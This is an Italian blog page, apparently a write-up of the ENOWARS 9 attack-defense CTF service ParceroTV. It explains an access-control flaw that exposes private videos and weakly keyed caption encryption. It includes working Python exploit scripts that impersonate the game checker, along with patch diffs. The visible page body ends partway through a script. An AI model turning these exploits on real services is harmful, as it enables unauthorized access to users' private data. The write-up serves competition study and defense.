<!DOCTYPE html>
<html lang="it" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>ENOWARS 9 | Portfolio</title>
<meta name="keywords" content="attack-defense, ctf, crypto, web, enowars">
<meta name="description" content="Alcune writeups della nona edizione delle ENOWARS.">
<meta name="author" content="AlBovo">
<link rel="canonical" href="https://albovo.github.io/it/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://albovo.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://albovo.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://albovo.github.io/favicon.ico">
<link rel="apple-touch-icon" href="https://albovo.github.io/favicon.ico">
<link rel="mask-icon" href="https://albovo.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://albovo.github.io/en/ctf/enowars2025/">
<link rel="alternate" hreflang="it" href="https://albovo.github.io/it/ctf/enowars2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>
<meta property="og:url" content="https://albovo.github.io/it/ctf/enowars2025/">
  <meta property="og:site_name" content="Portfolio">
  <meta property="og:title" content="ENOWARS 9">
  <meta property="og:description" content="Alcune writeups della nona edizione delle ENOWARS.">
  <meta property="og:locale" content="it">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-07-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-07-29T00:00:00+00:00">
    <meta property="article:tag" content="Attack-Defense">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Crypto">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Enowars">
    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
<meta name="twitter:title" content="ENOWARS 9">
<meta name="twitter:description" content="Alcune writeups della nona edizione delle ENOWARS.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag üö©",
      "item": "https://albovo.github.io/it/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ENOWARS 9",
      "item": "https://albovo.github.io/it/ctf/enowars2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ENOWARS 9",
  "name": "ENOWARS 9",
  "description": "Alcune writeups della nona edizione delle ENOWARS.",
  "keywords": [
    "attack-defense", "ctf", "crypto", "web", "enowars"
  ],
  "articleBody": "ENOWARS 9 üö© ParceroTV üåê Panoramica ParceroTV era un‚Äôapplicazione web di condivisione video, simile a una versione in piccolo di YouTube, sviluppata con un backend in Rust usando il framework Actix-web e un database SQLite. Il servizio permetteva agli utenti di registrarsi, effettuare il login e caricare video e ‚Äúshorts‚Äù. I video potevano essere contrassegnati come pubblici o privati, e gli utenti potevano creare playlist, commentare i video e visualizzare i profili di altri utenti. L‚Äôapplicazione includeva anche una funzionalit√† ‚Äúshorts‚Äù con didascalie auto-generate in spagnolo.\nAnalisi e vulnerabilit√† Il servizio conteneva due vulnerabilit√† critiche: un problema di Broken Access Control che consentiva l‚Äôaccesso ai video privati di altri utenti, e un‚Äôimplementazione di crittografia insicura nel sistema di didascalie degli shorts.\nVulnerabilit√† 1: Broken Access Control nell‚ÄôAPI dei video privati La vulnerabilit√† principale si trovava nell‚Äôendpoint API responsabile del recupero dei video privati di un utente: /get_private_videos/{user_id}. L‚Äôhandler per questa rotta prendeva l‚ÄôID utente direttamente dal percorso URL e lo usava per interrogare il database alla ricerca di tutti i video privati associati.\nIl difetto critico era il totale assenza di controlli di autorizzazione. Il codice non verificava se il user_id fornito nell‚ÄôURL corrispondesse al user_id dell‚Äôutente autenticato memorizzato nella sessione. Questo significava che qualsiasi utente loggato poteva enumerare e accedere ai metadati dei video privati di un altro utente semplicemente indovinando o recuperando il suo ID utente.\n√à stato reso trivialmente semplice grazie a un altro endpoint, /get_user_info_with_name/{name}, che restituiva le informazioni di un utente, incluso il suo ID, basandosi sul suo nome utente.\nIl percorso d‚Äôexploit era il seguente:\nUn attaccante registra un nuovo account sulla piattaforma. L‚Äôattaccante usa l‚Äôendpoint /get_user_info_with_name/{victim_username} per ottenere l‚Äôunico user_id della vittima. L‚Äôattaccante invia una richiesta a /get_private_videos/{victim_user_id}. L‚ÄôAPI autorizza in modo improprio la richiesta e restituisce un oggetto JSON contenente i metadati di tutti i video privati della vittima, uno dei quali conteneva il flag nascosto nel campo di descrizione, codificato in Brainfuck. Vulnerabilit√† 2: Crittografia insicura nelle didascalie degli shorts La seconda vulnerabilit√† riguardava la funzionalit√† ‚Äúshorts‚Äù. Quando un utente caricava uno short con didascalie, il backend le ‚Äútraduceva‚Äù in spagnolo e le salvava come file .vtt. Questo processo prevedeva uno schema di crittografia personalizzato.\nL‚Äôanalisi dello script di exploit NPI_hecker404_parceroTV_shorts.py e del codice sorgente del backend (shorts_lib.rs) ha rivelato che la crittografia era gravemente difettosa:\nGenerazione di chiave prevedibile: la chiave di crittografia ChaCha20 a 256 bit era derivata direttamente dalla durata dello short in secondi (un valore float). Questo valore veniva convertito in millisecondi e utilizzato come seed. Cos√¨ si creava uno spazio di chiavi estremamente piccolo e prevedibile, rendendo banale un attacco brute-force con valori di durata comuni. Codifica personalizzata: prima della crittografia, il testo in chiaro veniva codificato in una serie di parole spagnole usando un dizionario fisso di 4096 parole (spanish_words.txt). Ogni parola rappresentava un blocco di 12 bit dei dati originali. Il percorso d‚Äôexploit era:\nL‚Äôattaccante individua uno short con didascalie tramite l‚Äôendpoint /get_shorts. Scarica il file di didascalie cifrate .vtt. Esegue il reverse della codifica in parole spagnole per ottenere il ciphertext grezzo. Esegue un brute-force della durata del video (lo script di exploit ha usato con successo valori come 4.6 e 2.5 secondi) per generare la chiave ChaCha20 corretta. Con la chiave corretta, decritta il ciphertext per rivelare il payload Brainfuck contenente il flag. Exploit Qui puoi leggere gli script di exploit che ho scritto con NPI.\n#!/bin/env python3 from pwn import * import requests import sys import json import string import random service_name = 'parceroTV' ip = sys.argv[1] alph = string.ascii_uppercase + string.digits if service_name: attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json() getid = attacksjson['services'][service_name][ip] def add_metadata(input_path: str, output_path: str, title: str = None, artist: str = None, genre: str = None) -\u003e None: cmd = [\"ffmpeg\", \"-i\", input_path] if title: cmd += [\"-metadata\", f\"title={title}\"] if artist: cmd += [\"-metadata\", f\"artist={artist}\"] if genre: cmd += [\"-metadata\", f\"genre={genre}\"] cmd += [\"-c\", \"copy\", output_path] subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def brainfuck(input): ... return output def attack(fid=None): try: username_f = fid['0'][0] URL = f'http://{ip}:7777' assert username_f is not None, \"User ID must be set\" username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12)) s = requests.Session() s.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}) s.get(URL) s.post(URL + '/newuser', data={'username': username, 'password': password}) s.post(URL + '/checkcredentials', data={'username': username, 'password': password}) userid = s.get(URL + f'/get_user_info_with_name/{username_f}').json()['id'] video = s.get(URL + f'/get_private_videos/{userid}').json()[0] a = f'metadata_{video['name']}_{''.join(random.choices(string.digits, k=4))}.mp4' m = [ video['name'], username_f, video['location'] ] add_metadata('video.mp4', a, title=m[0], artist=m[1], genre=m[2]) s.post(URL + '/app/create_video', data={ 'name': video['name'], 'description': os.urandom(12).hex(), 'is_private': 1, 'location': video['location'], }, files={ 'file': open(a, 'rb'), 'thumbnail': open('thumbnail.png', 'rb') }) print(f'{a}', flush=True) path = '/get_video_info/' + s.get(URL + '/get_my_videos').json()[0]['path'] print(brainfuck(s.get(URL + path).json()['description']), flush=True) except: pass if getid: for round in getid: attack(getid[round]) else: attack() E\n#!/usr/bin/env python3 import requests, re, sys, random, string from pathlib import Path from typing import List, Dict, Set from cryptography.hazmat.primitives.ciphers import Cipher, algorithms from cryptography.hazmat.backends import default_backend PER_LETTER = 4096 // 26 alph = string.ascii_uppercase + string.digits def brainfuck(input): ... return output def build_spanish_words(path: str = \"spanish_words.txt\") -\u003e List[bytes]: raw = Path(path).read_bytes() all_words = [w.strip() for w in raw.splitlines() if w.strip()] groups: Dict[bytes, List[bytes]] = {} for w in all_words: first = w[0:1].lower() if b'a' \u003c= first \u003c= b'z': groups.setdefault(first, []).append(w) used: Set[bytes] = set() result: List[bytes] = [] for letter_ord in range(ord(b'a'), ord(b'z') + 1): letter = bytes([letter_ord]) bucket = groups.get(letter, []) for w in bucket[:PER_LETTER]: if w not in used: used.add(w) result.append(w) for w in all_words: if len(result) \u003e= 4096: break if w not in used: used.add(w) result.append(w) if len(result) != 4096: raise ValueError(f\"Expected 4096 words, got {len(result)}\") return result def decrypt_spanish_stream( cipher_words: List[bytes], duration_secs: float, words_file: str = \"spanish_words.txt\" ) -\u003e str: table = build_spanish_words(words_file) inv_table = {w: i for i, w in enumerate(table)} bit_buf = 0 bit_count = 0 cipher_bytes = bytearray() for w in cipher_words: try: idx = inv_table[w] except KeyError: # Questa situazione non dovrebbe verificarsi con la corretta gestione dei byte continue if idx \u003e= 4096: raise ValueError(f\"Word index out of range: {idx}\") bit_buf = (bit_buf \u003c\u003c 12) | idx bit_count += 12 while bit_count \u003e= 8: bit_count -= 8 byte = (bit_buf \u003e\u003e bit_count) \u0026 0xFF cipher_bytes.append(byte) ms = int(round(duration_secs * 1000.0)) if ms == 0: ms = 1 seed = ms.to_bytes(8, \"little\") + b\"\\x00\" * 24 key = seed nonce = b\"\\x00\" * 16 cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor() keystream = cipher.update(b\"\\x00\" * len(cipher_bytes) * 8) plain_bytes = bytearray() for i, cb in enumerate(cipher_bytes): kb = keystream[i * 8] plain_bytes.append(cb ^ kb) return plain_bytes.decode(\"utf-8\", errors=\"ignore\") session = requests.Session() session.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}) def extract_vtt_text(vtt_content: bytes) -\u003e List[bytes]: lines = vtt_content.splitlines() text_lines = [] for line in lines: if re.match(br'^\\d+$', line): continue if re.match(br'^\\d{2}:\\d{2}:\\d{2}\\.\\d{3} --\u003e \\d{2}:\\d{2}:\\d{2}\\.\\d{3}$', line): continue if line.strip() == b\"\": continue if line.startswith(b'WEBVTT'): continue text_lines.append(line.strip()) # Unisce tutte le linee di testo e poi le suddivide in parole full_text = b' '.join(text_lines) return full_text.split() assert len(sys.argv) == 2 TEAM_IP = sys.argv[1] service_name = 'parceroTV' attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()['services'][service_name][TEAM_IP] URL = f'http://{TEAM_IP}:7777' for rnd in attacksjson.items(): vtt_file = rnd[1]['1'][0] username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12)) session.get(URL) session.post(URL + '/newuser', data={'username': username, 'password': password}) session.post(URL + '/checkcredentials', data={'username': username, 'password': password}) r = session.get(URL + '/get_shorts').json() c = None for i in r: if i['name'] == vtt_file: c = i['caption_path'] break if c: vtt_raw = session.get(URL + c).content encrypted = extract_vtt_text(vtt_raw) durations = [4.6, 2.5] for d in durations: f = decrypt_spanish_stream(encrypted, d, words_file=\"spanish_words.txt\") if f.startswith('@') and f.endswith('@'): print(brainfuck(f), flush=True) Patch Le modifiche git in staging mostrano che la vulnerabilit√† di Broken Access Control √® stata corretta in backend/src/main.rs.\nCorrezione per l‚Äôaccesso ai video privati: la funzione get_private_videos_by_userid √® stata modificata per includere un controllo di autorizzazione essenziale. Ora confronta il user_id della sessione con quello nell‚ÄôURL. Se non corrispondono, la richiesta viene respinta.\n--- a/backend/src/main.rs +++ b/backend/src/main.rs @@ -654,8 +654,11 @@ async fn get_private_videos_by_userid( pool: web::Data, user_id: web::Path, ) -\u003e Result { if let Ok(Some(_user_id)) = session.get::(\"user_id\") { - let conn = get_db_conn(\u0026pool).await?; let user_id = user_id.into_inner(); + if _user_id != user_id { + return Ok(redirect!(\"/no_permission\")); + } + let conn = get_db_conn(\u0026pool).await?; let videoss = web::block(move || select_private_videos_by_userid(conn, user_id)) .await? .map_err(error::ErrorInternalServerError)?; Defesa-in-depth per le informazioni video: un controllo analogo √® stato aggiunto all‚Äôendpoint /get_video_info/{path:.*}. Questa patch garantisce che solo il proprietario di un video possa ottenere i suoi metadati dettagliati, prevenendo ulteriori fughe di informazioni anche se un attaccante trovasse un‚Äôaltra via per accedere al percorso del video.\n--- a/backend/src/main.rs +++ b/backend/src/main.rs @@ -738,6 +741,9 @@ async fn get_video_info( let video_info = web::block(move || select_video_by_path(conn, \u0026path)) .await? .map_err(error::ErrorInternalServerError)?; + if video_info.userId != user_id { + return Ok(redirect!(\"/no_permission\")); + } Ok(HttpResponse::Ok().json(video_info)) } } else { Non sono state trovate patch negli staged changes per la vulnerabilit√† di crittografia insicura nel sistema di didascalie degli shorts, il che suggerisce che potrebbe essere stata trascurata o prevista in un commit successivo.\nDifesa a livello di rete Oltre alle patch a livello di codice, √® stata implementata una difesa a livello di rete. Abbiamo configurato il reverse proxy per ispezionare le richieste HTTP in arrivo. Identificando il User-Agent e altri header specifici utilizzati dal checker del gioco, abbiamo creato una regola di filtraggio. Qualsiasi richiesta al servizio che non corrispondesse al profilo di header del checker veniva bloccata. Questo ha mitigato efficacemente attacchi semplici automatizzati, costringendo gli avversari a costruire exploit pi√π sofisticati in grado di emulare correttamente il traffico del checker, come dimostrato dagli header User-Agent presenti negli script di exploit forniti.\n",
  "wordCount" : "1567",
  "inLanguage": "it",
  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups","datePublished": "2025-07-29T00:00:00Z",
  "dateModified": "2025-07-29T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "AlBovo"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://albovo.github.io/it/ctf/enowars2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Portfolio",
    "logo": {
      "@type": "ImageObject",
      "url": "https://albovo.github.io/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://albovo.github.io/it/" accesskey="h" title="Home (Alt + H)">
                <img src="https://albovo.github.io/favicon.ico" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                    <ul class="lang-switch"><li>|</li>
                        <li>
                            <a href="https://albovo.github.io/en/" title="üá¨üáß En"
                                aria-label=":uk: En">üá¨üáß En</a>
                        </li>
                    </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://albovo.github.io/it/projects/" title="üìí Progetti">
                    <span>üìí Progetti</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/it/ctf/" title="‚öô Writeups">
                    <span>‚öô Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/it/aoc/" title="üéÑ Advent of Code">
                    <span>üéÑ Advent of Code</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/it/competitions/" title="üèÜ Competizioni">
                    <span>üèÜ Competizioni</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://albovo.github.io/it/">Home</a>&nbsp;¬ª&nbsp;<a href="https://albovo.github.io/it/ctf/">Capture The Flag üö©</a></div>
    <h1 class="post-title entry-hint-parent">
      ENOWARS 9
    </h1>
    <div class="post-description">
      Alcune writeups della nona edizione delle ENOWARS.
    </div>
    <div class="post-meta"><span title='2025-07-29 00:00:00 +0000 UTC'>luglio 29, 2025</span>&nbsp;¬∑&nbsp;<span>8 minuti</span>&nbsp;¬∑&nbsp;<span>1567 parole</span>&nbsp;¬∑&nbsp;<span>AlBovo</span>&nbsp;|&nbsp;<span>Traduzioni:</span>
<ul class="i18n_list">
    <li>
        <a href="https://albovo.github.io/en/ctf/enowars2025/">üá¨üáß En</a>
    </li>
</ul>&nbsp;|&nbsp;<span>
    <a href="https://github.com/AlBovo/AlBovo.github.io/blob/main/content/it/ctf/enowars2025.md" rel="noopener noreferrer edit" target="_blank">Suggerisci modifiche</a>
</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Indice contenuti</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#parcerotv-">ParceroTV üåê</a>
      <ul>
        <li><a href="#panoramica">Panoramica</a></li>
        <li><a href="#analisi-e-vulnerabilit√†">Analisi e vulnerabilit√†</a></li>
        <li><a href="#exploit">Exploit</a></li>
        <li><a href="#patch">Patch</a></li>
        <li><a href="#difesa-a-livello-di-rete">Difesa a livello di rete</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="enowars-9-">ENOWARS 9 üö©<a hidden class="anchor" aria-hidden="true" href="#enowars-9-">#</a></h1>
<p><img alt="enowars logo" loading="lazy" src="/images/enowars.png"></p>
<h2 id="parcerotv-">ParceroTV üåê<a hidden class="anchor" aria-hidden="true" href="#parcerotv-">#</a></h2>
<h3 id="panoramica">Panoramica<a hidden class="anchor" aria-hidden="true" href="#panoramica">#</a></h3>
<p><strong>ParceroTV</strong> era un‚Äôapplicazione web di condivisione video, simile a una versione in piccolo di YouTube, sviluppata con un backend in <strong>Rust</strong> usando il framework <strong>Actix-web</strong> e un database <strong>SQLite</strong>. Il servizio permetteva agli utenti di registrarsi, effettuare il login e caricare video e ‚Äúshorts‚Äù. I video potevano essere contrassegnati come pubblici o privati, e gli utenti potevano creare playlist, commentare i video e visualizzare i profili di altri utenti. L‚Äôapplicazione includeva anche una funzionalit√† ‚Äúshorts‚Äù con didascalie auto-generate in spagnolo.</p>
<h3 id="analisi-e-vulnerabilit√†">Analisi e vulnerabilit√†<a hidden class="anchor" aria-hidden="true" href="#analisi-e-vulnerabilit√†">#</a></h3>
<p>Il servizio conteneva due vulnerabilit√† critiche: un problema di Broken Access Control che consentiva l‚Äôaccesso ai video privati di altri utenti, e un‚Äôimplementazione di crittografia insicura nel sistema di didascalie degli shorts.</p>
<h4 id="vulnerabilit√†-1-broken-access-control-nellapi-dei-video-privati">Vulnerabilit√† 1: Broken Access Control nell‚ÄôAPI dei video privati<a hidden class="anchor" aria-hidden="true" href="#vulnerabilit√†-1-broken-access-control-nellapi-dei-video-privati">#</a></h4>
<p>La vulnerabilit√† principale si trovava nell‚Äôendpoint API responsabile del recupero dei video privati di un utente: <code>/get_private_videos/{user_id}</code>. L‚Äôhandler per questa rotta prendeva l‚ÄôID utente direttamente dal percorso URL e lo usava per interrogare il database alla ricerca di tutti i video privati associati.</p>
<p>Il difetto critico era il <strong>totale assenza di controlli di autorizzazione</strong>. Il codice non verificava se il <code>user_id</code> fornito nell‚ÄôURL corrispondesse al <code>user_id</code> dell‚Äôutente autenticato memorizzato nella sessione. Questo significava che qualsiasi utente loggato poteva enumerare e accedere ai metadati dei video privati di un altro utente semplicemente indovinando o recuperando il suo ID utente.</p>
<p>√à stato reso trivialmente semplice grazie a un altro endpoint, <code>/get_user_info_with_name/{name}</code>, che restituiva le informazioni di un utente, incluso il suo ID, basandosi sul suo nome utente.</p>
<p>Il percorso d‚Äôexploit era il seguente:</p>
<ol>
<li>Un attaccante registra un nuovo account sulla piattaforma.</li>
<li>L‚Äôattaccante usa l‚Äôendpoint <code>/get_user_info_with_name/{victim_username}</code> per ottenere l‚Äôunico <code>user_id</code> della vittima.</li>
<li>L‚Äôattaccante invia una richiesta a <code>/get_private_videos/{victim_user_id}</code>.</li>
<li>L‚ÄôAPI autorizza in modo improprio la richiesta e restituisce un oggetto JSON contenente i metadati di tutti i video privati della vittima, uno dei quali conteneva il flag nascosto nel campo di descrizione, codificato in Brainfuck.</li>
</ol>
<h4 id="vulnerabilit√†-2-crittografia-insicura-nelle-didascalie-degli-shorts">Vulnerabilit√† 2: Crittografia insicura nelle didascalie degli shorts<a hidden class="anchor" aria-hidden="true" href="#vulnerabilit√†-2-crittografia-insicura-nelle-didascalie-degli-shorts">#</a></h4>
<p>La seconda vulnerabilit√† riguardava la funzionalit√† ‚Äúshorts‚Äù. Quando un utente caricava uno short con didascalie, il backend le ‚Äútraduceva‚Äù in spagnolo e le salvava come file <code>.vtt</code>. Questo processo prevedeva uno schema di crittografia personalizzato.</p>
<p>L‚Äôanalisi dello script di exploit <code>NPI_hecker404_parceroTV_shorts.py</code> e del codice sorgente del backend (<code>shorts_lib.rs</code>) ha rivelato che la crittografia era gravemente difettosa:</p>
<ol>
<li><strong>Generazione di chiave prevedibile</strong>: la chiave di crittografia ChaCha20 a 256 bit era derivata direttamente dalla durata dello short in secondi (un valore <code>float</code>). Questo valore veniva convertito in millisecondi e utilizzato come seed. Cos√¨ si creava uno spazio di chiavi estremamente piccolo e prevedibile, rendendo banale un attacco brute-force con valori di durata comuni.</li>
<li><strong>Codifica personalizzata</strong>: prima della crittografia, il testo in chiaro veniva codificato in una serie di parole spagnole usando un dizionario fisso di 4096 parole (<code>spanish_words.txt</code>). Ogni parola rappresentava un blocco di 12 bit dei dati originali.</li>
</ol>
<p>Il percorso d‚Äôexploit era:</p>
<ol>
<li>L‚Äôattaccante individua uno short con didascalie tramite l‚Äôendpoint <code>/get_shorts</code>.</li>
<li>Scarica il file di didascalie cifrate <code>.vtt</code>.</li>
<li>Esegue il reverse della codifica in parole spagnole per ottenere il ciphertext grezzo.</li>
<li>Esegue un brute-force della durata del video (lo script di exploit ha usato con successo valori come <code>4.6</code> e <code>2.5</code> secondi) per generare la chiave ChaCha20 corretta.</li>
<li>Con la chiave corretta, decritta il ciphertext per rivelare il payload Brainfuck contenente il flag.</li>
</ol>
<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
<p>Qui puoi leggere gli script di exploit che ho scritto con NPI.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">service_name</span> <span class="o">=</span> <span class="s1">&#39;parceroTV&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alph</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">service_name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">attacksjson</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://9.enowars.com/scoreboard/attack.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">getid</span> <span class="o">=</span> <span class="n">attacksjson</span><span class="p">[</span><span class="s1">&#39;services&#39;</span><span class="p">][</span><span class="n">service_name</span><span class="p">][</span><span class="n">ip</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_metadata</span><span class="p">(</span><span class="n">input_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">output_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">title</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">artist</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">genre</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;ffmpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;-i&#34;</span><span class="p">,</span> <span class="n">input_path</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">title</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;title=</span><span class="si">{</span><span class="n">title</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">artist</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;artist=</span><span class="si">{</span><span class="n">artist</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">genre</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;genre=</span><span class="si">{</span><span class="n">genre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
